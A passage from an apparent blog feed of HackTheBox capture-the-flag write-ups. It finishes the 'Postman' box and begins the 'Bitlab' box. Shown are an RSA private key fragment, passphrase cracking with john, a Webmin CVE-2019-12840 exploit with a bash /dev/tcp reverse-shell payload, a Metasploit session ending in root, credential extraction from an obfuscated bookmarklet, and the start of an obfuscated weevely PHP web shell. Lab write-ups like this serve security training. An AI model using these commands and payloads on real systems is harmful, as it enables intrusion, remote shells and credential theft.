class="line">l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X</span><br><span class="line">0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p</span><br><span class="line">S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR</span><br><span class="line">hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+</span><br><span class="line">Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V</span><br><span class="line">XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD</span><br><span class="line">b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi</span><br><span class="line">WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh</span><br><span class="line">KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm</span><br><span class="line">npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ</span><br><span class="line">VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W</span><br><span class="line">X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>A private RSA key, we can probably use it to connect to <code>matt</code> account using SSH… Let’s pull this key to work on it offline:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ scp -i id_rsa redis@postman.htb:/opt/id_rsa.bak .</span><br><span class="line">id_rsa.bak  100% 1743    48.1KB/s   00:00</span><br></pre></td></tr></table></figure><p>First thing to try login through SSH on <code>Matt</code>‘s’ account with this key:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ chmod 600 id_rsa.bak</span><br><span class="line">[hg8@archbook ~]$ ssh -i id_rsa.bak Matt@postman.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'id_rsa.bak'</span>:</span><br></pre></td></tr></table></figure><p>Of course a passphare is needed. Maybe we can bruteforce it? Calling <code>john</code> to the rescue:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh2john id_rsa.bak &gt; id_rsa.hash</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">computer2008     (id_rsa.bak)</span><br><span class="line">1g 0:00:00:12 DONE (2019-12-22 21:16) 0.08264g/s 1185Kp/s 1185Kc/s 1185KC/s *7¡Vamos!</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p>Good, we got a passphrase here! Let’s try to login again:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa.bak Matt@postman.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'id_rsa.bak'</span>:</span><br><span class="line">Connection closed by 10.10.10.160 port 22</span><br></pre></td></tr></table></figure><p>We immediately get a<code>Connection closed</code> error message upon connexion… Seems like we have the right ssh key, the right passphare but the ssh config forbid <code>Matt</code> to connect.</p><p>Let’s confirm those doubts:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis@Postman:~$ cat /etc/ssh/sshd_config</span><br><span class="line">[...]</span><br><span class="line"><span class="comment">#deny users</span></span><br><span class="line">DenyUsers Matt</span><br></pre></td></tr></table></figure><p>Alright so <code>Matt</code> is not allowed to SSH, we need to find another way to access his account.</p><p>If <code>Matt</code> reuse password we should be able switch to <code>Matt</code> from <code>Redis</code> user using <code>su</code>…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis@Postman:~$ su - Matt</span><br><span class="line">Password:</span><br><span class="line">Matt@Postman:~$ cat user.txt</span><br><span class="line">51xxxxxxxxxxxxxxxxxxxxxx3c</span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>Now that we have access to our user, let’s make a bit of recon to see if we can escalate our privileges to root. </p><p>After a while we can not find anything worthy onto <code>Matt</code> account. Once again, when being stuck let’s go back at beginning to make sure we don’t forget anything. Remember that Webmin instance ? It must be there for a reason…</p><p>Knowing that <code>Matt</code> reuse his password maybe we can be able to connect to Webmin using the same credentials (<code>Matt</code>:<code>computer2008</code>) ?</p><p>Let’s try to login:</p><p><img src="https://user-images.githubusercontent.com/9076747/71327015-402c5c00-2503-11ea-871c-0a5321984f47.png" alt="postman webmin login"></p><p>Success! <code>We are in...</code></p><p>From this control panel we can not access a lot… Only the <code>Software Package Updates</code> page. We can not seem to do anything interesting from there.</p><p>Knowing from the <code>nmap</code> result and the page footer, the Webmin version is <code>1.910</code>, let’s see if some exploit have been published:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ searchsploit webmin</span><br><span class="line">----------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                             |  Path</span><br><span class="line">                                                           | (/usr/share/exploitdb/)</span><br><span class="line">----------------------------------------------------------- ----------------------------------------</span><br><span class="line">DansGuardian Webmin Module 0.x - <span class="string">'edit.cgi'</span> Directory Trav | exploits/cgi/webapps/23535.txt</span><br><span class="line">Webmin - Brute Force / Command Execution                   | exploits/multiple/remote/705.pl</span><br><span class="line">Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofin | exploits/linux/remote/22275.pl</span><br><span class="line">Webmin 0.x - <span class="string">'RPC'</span> Privilege Escalation                    | exploits/linux/remote/21765.pl</span><br><span class="line">Webmin 0.x - Code Input Validation                         | exploits/linux/<span class="built_in">local</span>/21348.txt</span><br><span class="line">Webmin 1.5 - Brute Force / Command Execution               | exploits/multiple/remote/746.pl</span><br><span class="line">Webmin 1.5 - Web Brute Force (CGI)                         | exploits/multiple/remote/745.pl</span><br><span class="line">Webmin 1.580 - <span class="string">'/file/show.cgi'</span> Remote Command Execution ( | exploits/unix/remote/21851.rb</span><br><span class="line">Webmin 1.850 - Multiple Vulnerabilities                    | exploits/cgi/webapps/42989.txt</span><br><span class="line">Webmin 1.900 - Remote Command Execution (Metasploit)       | exploits/cgi/remote/46201.rb</span><br><span class="line">Webmin 1.910 - <span class="string">'Package Updates'</span> Remote Command Execution  | exploits/linux/remote/46984.rb</span><br><span class="line">Webmin 1.920 - Remote Code Execution                       | exploits/linux/webapps/47293.sh</span><br><span class="line">Webmin 1.920 - Unauthenticated Remote Code Execution (Meta | exploits/linux/remote/47230.rb</span><br><span class="line">Webmin 1.x - HTML Email Command Execution                  | exploits/cgi/webapps/24574.txt</span><br><span class="line">Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosu | exploits/multiple/remote/1997.php</span><br><span class="line">Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosu | exploits/multiple/remote/2017.pl</span><br><span class="line">phpMyWebmin 1.0 - <span class="string">'target'</span> Remote File Inclusion           | exploits/php/webapps/2462.txt</span><br><span class="line">phpMyWebmin 1.0 - <span class="string">'window.php'</span> Remote File Inclusion       | exploits/php/webapps/2451.txt</span><br><span class="line">webmin 0.91 - Directory Traversal                          | exploits/cgi/remote/21183.txt</span><br><span class="line">----------------------------------------------------------- ----------------------------------------</span><br></pre></td></tr></table></figure><p>Well well, what do we have here… <code>Webmin 1.910 - &#39;Package Updates&#39; Remote Command Execution</code>. Sounds exactly what we need! Let’s try this one.</p><p>This exploit first came as a Metasploit module, but since I try to avoid using Metasploit as much as possible I will use this <a href="https://github.com/bkaraceylan/CVE-2019-12840_POC" target="_blank" rel="noopener">Python version</a>.</p><p>First, let’s open our netcat listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>And let’s launch the exploit (after reading the source code, no modification seems needed to make it work properly on this box):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ git <span class="built_in">clone</span> https://github.com/bkaraceylan/CVE-2019-12840_POC.git</span><br><span class="line">Cloning into <span class="string">'CVE-2019-12840_POC'</span>...</span><br><span class="line">Unpacking objects: 100% (10/10), <span class="keyword">done</span>.</span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">cd</span> CVE-2019-12840_POC</span><br><span class="line">[hg8@archbook ~]$ python exploit.py -u https://postman.htb -p 10000 -U Matt -P computer2008 -c <span class="string">"bash -i &gt;&amp; /dev/tcp/10.10.10.10/8585 0&gt;&amp;1"</span></span><br><span class="line">[*] Attempting to login...</span><br><span class="line">[*] Exploiting...</span><br><span class="line">[*] Executing payload...</span><br></pre></td></tr></table></figure><p>Aaaand a new connection open on our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.160:54474</span><br><span class="line"></span><br><span class="line">root@Postman:/usr/share/webmin/package-updates/<span class="comment"># cd</span></span><br><span class="line">root@Postman:~<span class="comment"># cat root.txt</span></span><br><span class="line">a2xxxxxxxxxxxxxxxxxxxxxce</span><br></pre></td></tr></table></figure><h2 id="Additional-information"><a href="#Additional-information" class="headerlink" title="Additional information"></a>Additional information</h2><p>For the CVE-2019-12840, Metasploit could have been used the following way:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ msfconsole</span><br><span class="line">msf5 &gt; use exploit/linux/http/webmin_packageup_rce</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/webmin_packageup_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD                    yes       Webmin Password</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT      10000            yes       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Base path <span class="keyword">for</span> Webmin application</span><br><span class="line">   USERNAME                    yes       Webmin Username</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Webmin &lt;= 1.910</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> RHOSTS 10.10.10.160</span><br><span class="line">RHOSTS =&gt; 10.10.10.160</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> LHOST 10.10.10.10</span><br><span class="line">LHOST =&gt; 10.10.10.160</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> username Matt</span><br><span class="line">username =&gt; Matt</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> password computer2008</span><br><span class="line">password =&gt; computer2008</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> payload cmd/unix/reverse_python</span><br><span class="line">payload =&gt; cmd/unix/reverse_python</span><br><span class="line"></span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> SSL <span class="literal">true</span></span><br><span class="line">SSL =&gt; <span class="literal">true</span></span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/webmin_packageup_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD   computer2008     yes       Webmin Password</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS     10.10.10.160     yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT      10000            yes       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">true</span>             no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Base path <span class="keyword">for</span> Webmin application</span><br><span class="line">   USERNAME   Matt             yes       Webmin Username</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_python):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.10.15.123     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  8585             yes       The listen port</span><br><span class="line">   SHELL  /bin/bash        yes       The system shell to use.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> msf5 exploit(linux/http/webmin_packageup_rce) &gt; check</span><br><span class="line"></span><br><span class="line">[*] NICE! Matt has the right to &gt;&gt;Package Update&lt;&lt;</span><br><span class="line">[+] 10.10.10.160:10000 - The target is vulnerable.</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.10:8585</span><br><span class="line">[+] Session cookie: 0712c463a268f71262aa809eb4f41928</span><br><span class="line">[*] Attempting to execute the payload...</span><br><span class="line">[*] Command shell session 1 opened (10.10.10.10:8585 -&gt; 10.10.10.160:38146) at 2019-11-05 02:07:59 +0100</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">cat /root/root.txt</span><br><span class="line">a2xxxxxxxxxxxxxxxxxxxxxce</span><br></pre></td></tr></table></figure><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Easy Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> gobuster </tag>
            
            <tag> john </tag>
            
            <tag> ssh </tag>
            
            <tag> postman </tag>
            
            <tag> webmin </tag>
            
            <tag> redis </tag>
            
            <tag> cve-2019-12840 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Bitlab</title>
      <link href="/posts/bitlab/"/>
      <url>/posts/bitlab/</url>
      
        <content type="html"><![CDATA[<img width="587" alt="bitlab-hackthebox" src="https://user-images.githubusercontent.com/9076747/82153801-02412300-986a-11ea-819e-b4337e7d8310.png"><p>Bitlab box was an interesting box, user part was typical real-life scenario (actually meet this scenario during multiple pentests) while the root part was my first time Reverse Engineering.</p><p><strong>Tl;Dr:</strong> The user part needed you access a Gitlab instance by using credentials leaked by one of the developer. From here you could merge a web-shell that is automatically pulled on the server by a <code>merge_request</code> webhook. Still from the Gitlab instance you find a piece of code with database credentials. With the web-shell as <code>www-data</code> you can pivot to <code>clave</code> user using his password found in the database and get the flag.<br>The root part was reverse engineering of an Windows binary to extract the <code>root</code> account password needed to grab the flag.</p><p>Alright! Let’s get into the details now!</p><hr><p>First we add the box ip to our host file and let’s start!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.114 bitlab.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag."></a>User flag.</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -sC bitlab.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-26 02:00 CEST</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx</span><br><span class="line">|_ http-robots.txt: 55 disallowed entries (15 shown)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 96.45 seconds</span><br></pre></td></tr></table></figure><p>We have a classical web app running on port 443 and the ssh port 22 open.</p><p>Opening <code>http://bitlab.htb</code> display the following a gitlab instance :</p><p><img src="https://user-images.githubusercontent.com/9076747/67625187-25eb4000-f82a-11e9-81e9-2541d037031e.png" alt="bitlab homepage"></p><p>Using <code>gobuster</code> to brute force for interesting directories and files won’t be useful here since all urls return a redirect to the login page. We will do the old fashioned way of manual browsing. I will be quick since there is only three links accessible from the main page:</p><ul><li><code>Explore</code> page is empty.</li><li><code>Help</code> show a directory listing for documentation. </li><li><code>bookmarks.html</code> page display what looks like the exported browser bookmarks of the developer.</li></ul><p>The <code>Gitlab - Sign In</code> bookmark looks usual:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">DT</span>&gt;</span><span class="tag">&lt;<span class="name">A</span> <span class="attr">HREF</span>=<span class="string">"javascript:(function()&#123; var _0x4b18=["</span>\<span class="attr">x76</span>\<span class="attr">x61</span>\<span class="attr">x6C</span>\<span class="attr">x75</span>\<span class="attr">x65</span>","\<span class="attr">x75</span>\<span class="attr">x73</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x5F</span>\<span class="attr">x6C</span>\<span class="attr">x6F</span>\<span class="attr">x67</span>\<span class="attr">x69</span>\<span class="attr">x6E</span>","\<span class="attr">x67</span>\<span class="attr">x65</span>\<span class="attr">x74</span>\<span class="attr">x45</span>\<span class="attr">x6C</span>\<span class="attr">x65</span>\<span class="attr">x6D</span>\<span class="attr">x65</span>\<span class="attr">x6E</span>\<span class="attr">x74</span>\<span class="attr">x42</span>\<span class="attr">x79</span>\<span class="attr">x49</span>\<span class="attr">x64</span>","\<span class="attr">x63</span>\<span class="attr">x6C</span>\<span class="attr">x61</span>\<span class="attr">x76</span>\<span class="attr">x65</span>","\<span class="attr">x75</span>\<span class="attr">x73</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x5F</span>\<span class="attr">x70</span>\<span class="attr">x61</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x77</span>\<span class="attr">x6F</span>\<span class="attr">x72</span>\<span class="attr">x64</span>","\<span class="attr">x31</span>\<span class="attr">x31</span>\<span class="attr">x64</span>\<span class="attr">x65</span>\<span class="attr">x73</span>\<span class="attr">x30</span>\<span class="attr">x30</span>\<span class="attr">x38</span>\<span class="attr">x31</span>\<span class="attr">x78</span>"];<span class="attr">document</span>[<span class="attr">_0x4b18</span>[<span class="attr">2</span>]](<span class="attr">_0x4b18</span>[<span class="attr">1</span>])[<span class="attr">_0x4b18</span>[<span class="attr">0</span>]]= <span class="string">_0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]</span>= <span class="string">_0x4b18[5];</span> &#125;)()" <span class="attr">ADD_DATE</span>=<span class="string">"1554932142"</span>&gt;</span>Gitlab Login<span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br></pre></td></tr></table></figure><p>The bookmark is not a classic url but javascript script. This is a useful trick that allow you to run javascript on a given website just by clicking on the bookmark icon.</p><p>Since the js is obfuscated a little let’s open the Gitlab login page and run it onto the console to see what happen :</p><p><img src="https://user-images.githubusercontent.com/9076747/67625306-f6d5ce00-f82b-11e9-84b8-7a47c3ba733b.png" alt="bitlab bookmark script"></p><p>The js script is automatically filling the login form with username <code>clave</code> and a password. While checking network we can see that the password is <code>11des0081x</code>.</p><p>So we have access to one developer Gitlab account. Out of curiosity I tried to SSH with those credentials but without surprise, it didn’t worked. Let’s move on.</p><p>We have access to two repositories :</p><ul><li>Deployer</li><li>Profile</li></ul><p>Seeing by the name we can guess that <code>deployer</code> will be a kind of script to automatically deploy application to the web server. Let’s try to understand the inner working better:</p><p><code>deployer</code> repository hold a single <code>index.php</code> file. The README file explain that it’s a webhook. Reading through the <a href="https://docs.gitlab.com/ee/user/project/integrations/webhooks.html" target="_blank" rel="noopener">documentation of gitlab</a> we can understand that a webhook is a function that will call a given url when a event occur on the repository:</p><blockquote><p>Project webhooks allow you to trigger a URL if for example new code is pushed or a new issue is created. You can configure webhooks to listen for specific events like pushes, issues or merge requests. GitLab will send a POST request with data to the webhook URL.</p></blockquote><p>In our case here, we can guess that the repository is configured to make a call to <code>http://bitlab.htb/deployer/index.php</code> when a action is made on the repository (can be commit, merge, pull request, etc…).  </p><p>Let’s take a look at the <code>index.php</code> to understand what action is made once it’s called :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$input = file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line">$payload  = json_decode($input);</span><br><span class="line"></span><br><span class="line">$repo = $payload-&gt;project-&gt;name ?? <span class="string">''</span>;</span><br><span class="line">$event = $payload-&gt;event_type ?? <span class="string">''</span>;</span><br><span class="line">$state = $payload-&gt;object_attributes-&gt;state ?? <span class="string">''</span>;</span><br><span class="line">$branch = $payload-&gt;object_attributes-&gt;target_branch ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($repo==<span class="string">'Profile'</span> &amp;&amp; $branch==<span class="string">'master'</span> &amp;&amp; $event==<span class="string">'merge_request'</span> &amp;&amp; $state==<span class="string">'merged'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> shell_exec(<span class="string">'cd ../profile/; sudo git pull'</span>),<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"OK\n"</span>;</span><br></pre></td></tr></table></figure><p>This a rather simple script. Judging from the <code>if</code> condition we understand that the script will change directory to <code>../profile/</code> and then make a <code>git pull</code> to get the latest changes on every merged merge request.   </p><p>It’s our luck, because we have control over the <code>profile</code> repository which is available through the Gitlab instance. That means that if we merge a file though a <code>merge_request</code> to the <code>profile</code> repository, the said file will automatically be pulled on the server by the <code>deployer/index.php</code> webhook. That’s the perfect scenario for a web-shell don’t you think? :)</p><h3 id="Web-shell-as-www-data"><a href="#Web-shell-as-www-data" class="headerlink" title="Web-shell as www-data"></a>Web-shell as www-data</h3><p>Through this Gitlab interface we can add a new file to the <code>profile</code> repository, it will be faster than cloning. </p><p>I used <a href="https://github.com/epinna/weevely3" target="_blank" rel="noopener"><code>weevely</code></a> to generate a php web-shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python weevely.py generate xxxxxxxx hg8.php</span><br><span class="line">Generated <span class="string">'hg8.php'</span> with password <span class="string">'xxxxxxxx'</span> of 762 byte size.</span><br><span class="line">[hg8@archbook ~]$ cat hg8.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$r</span>=<span class="string">'$k="ab+-c7+-377b";$kh=+-"3b+-25356491d+-a";$+-kf="+-be0+-0e7cb757+-b";$p=+-"w0NSnMM+-i'</span>;</span><br><span class="line"><span 